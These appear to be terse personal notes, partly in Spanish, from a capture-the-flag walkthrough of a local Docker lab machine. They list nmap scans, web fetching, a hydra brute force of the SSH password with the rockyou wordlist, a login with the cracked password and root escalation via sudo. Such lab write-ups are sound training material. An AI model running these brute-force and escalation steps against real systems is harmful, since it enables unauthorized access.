![[Pasted image 20260122235830.png]]


```bash

sudo bash auto_deploy.sh borazuwarahctf.tar
```

![[Pasted image 20260122235830.png]]

```bash

ping -c 1 ip
ping -c 1 ip -R
nmap -sn ip
```

```bash

nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 172.17.0.2
```

![[Pasted image 20260123000012.png]]

```bash
nmap -p 22,80 -A 172.17.0.2 -vvv  
```

![[Pasted image 20260123000107.png]]

```bash
curl -I http://172.17.0.2
curl http://172.17.0.2

```

![[Pasted image 20260123000228.png]]


```bash
wget http://172.17.0.2
```

![[Pasted image 20260123001312.png]]

vamos a a la ip en el browser y descargamos la imagen

![[Pasted image 20260123002057.png]]

![[Pasted image 20260123002134.png]]

```bash
sshpass -p ' ' ssh borazuwarah@172.17.0.2 # no sirve en este caso ya que no tiene contrseña
ssh borazuwarah@172.17.0.2

```

si tiene al final
![[Pasted image 20260123002746.png]]

```bash
hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

sshpass -p '123456' ssh borazuwarah@172.17.0.2
```
![[Pasted image 20260123002911.png]]


![[Pasted image 20260123003024.png]]

```bash
sudo /bin/bash

```
